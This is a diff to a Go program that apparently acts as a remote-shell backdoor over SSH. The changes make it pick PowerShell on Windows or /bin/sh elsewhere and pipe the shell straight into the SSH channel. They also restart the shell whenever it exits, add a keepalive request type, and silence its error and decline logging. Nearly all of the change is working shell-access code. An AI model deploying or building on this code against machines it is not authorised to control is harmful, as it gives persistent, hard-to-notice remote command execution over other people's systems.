@@ -9,6 +9,7 @@ import (
 	"net"
 	"os"
 	"os/exec"
+	"runtime"
 	"strings"
 
 	"golang.org/x/crypto/ssh"
@@ -27,7 +28,7 @@ func main() {
 
 	hostkey, err := makeHostKey()
 	if err != nil {
-		fmt.Println("[!] Error creating key.")
+		fmt.Println("[!] Error creating key:", err)
 		return
 	}
 	config.AddHostKey(hostkey)
@@ -47,12 +48,19 @@ func main() {
 
 	go handleRequests(requests)
 	go handleChannels(channels)
+
 	ssh_connection.Wait()
+	fmt.Println("[*] Connection closed")
 }
 
 func handleRequests(requests <-chan *ssh.Request) {
 	for req := range requests {
-		fmt.Println("[*] Recieved out-of-band request:", req)
+		switch req.Type {
+		case "pingpong":
+			req.Reply(true, nil)
+		default:
+			req.Reply(false, nil)
+		}
 	}
 }
 
@@ -64,57 +72,61 @@ func handleChannels(channels <-chan ssh.NewChannel) {
 		}
 		channel, requests, err := newChannel.Accept()
 		if err != nil {
-			fmt.Println("Error accepting channel", err)
+			//fmt.Println("[!] Error accepting channel:", err)
 			continue
 		}
 
-		shell := os.Getenv("SHELL")
-		if shell == "" {
-			shell = DEFAULT_SHELL
-		}
+		go handleSession(channel, requests)
+	}
+}
 
-		// Not dealing with any type of request except shell
-		go func(in <-chan *ssh.Request) {
-			for req := range in {
-				ok := false
-				switch req.Type {
-				case "shell":
-					ok = true
-					go func() {
-						defer channel.Close()
-						cmd := exec.Command(shell)
-						cmd.Stdin = channel
-						cmd.Stdout = channel
-						cmd.Stderr = channel
-						cmd.Start()
-						cmd.Wait()
-					}()
-					if len(req.Payload) > 0 {
-						ok = false
-					}
+func handleSession(channel ssh.Channel, requests <-chan *ssh.Request) {
+	defer channel.Close()
+
+	var shell string
+	if runtime.GOOS == "windows" {
+		shell = "powershell.exe"
+	} else {
+		shell = "/bin/sh"
+	}
+
+	for req := range requests {
+		switch req.Type {
+		case "shell":
+			req.Reply(true, nil)
+			for true {
+				cmd := exec.Command(shell)
+				cmd.Env = os.Environ()
+
+				cmd.Stdin = channel
+				cmd.Stdout = channel
+				cmd.Stderr = channel
+
+				if err := cmd.Start(); err != nil {
+					fmt.Println("[!] Shell start error:", err)
+					return
 				}
-				if !ok {
-					fmt.Println("[*] Declining request:", req.Type)
-				}
-				req.Reply(ok, nil)
+				cmd.Wait()
+				// This loops. If cmd (shell) exits, it reopens another shell
+				// Ctrl+C on the "server" end closes the connection
 			}
-		}(requests)
+		default:
+			//fmt.Println("[*] Declining request:", req.Type)
+			req.Reply(false, nil)
+		}
 	}
 }
 
 func makeHostKey() (ssh.Signer, error) {
-	key, err := rsa.GenerateKey(rand.Reader, 2014)
+	key, err := rsa.GenerateKey(rand.Reader, 2048)
 	if err != nil {
 		return nil, err
 	}
+
 	privateKey := pem.Block{
-		Type:    "RSA PRIVATE KEY",
-		Headers: nil,
-		Bytes:   x509.MarshalPKCS1PrivateKey(key),
+		Type:  "RSA PRIVATE KEY",
+		Bytes: x509.MarshalPKCS1PrivateKey(key),
 	}
-	hostkey, err := ssh.ParsePrivateKey(pem.EncodeToMemory(&privateKey))
-	if err != nil {
-		return nil, err
-	}
-	return hostkey, nil
+
+	return ssh.ParsePrivateKey(pem.EncodeToMemory(&privateKey))
 }
